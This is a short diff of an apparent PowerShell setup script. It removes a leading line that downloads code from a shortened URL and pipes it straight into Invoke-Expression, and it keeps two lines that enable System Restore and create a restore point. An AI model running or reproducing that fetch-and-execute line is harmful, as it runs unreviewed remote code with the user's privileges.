@@ -1,8 +1,3 @@
-iwr -useb https://esyl.short.gy/AndrewTool | iex
-
-
-
-
 Enable-ComputerRestore -Drive "C:\"
 Checkpoint-Computer -Description "RestorePoint1" -RestorePointType "MODIFY_SETTINGS"
 
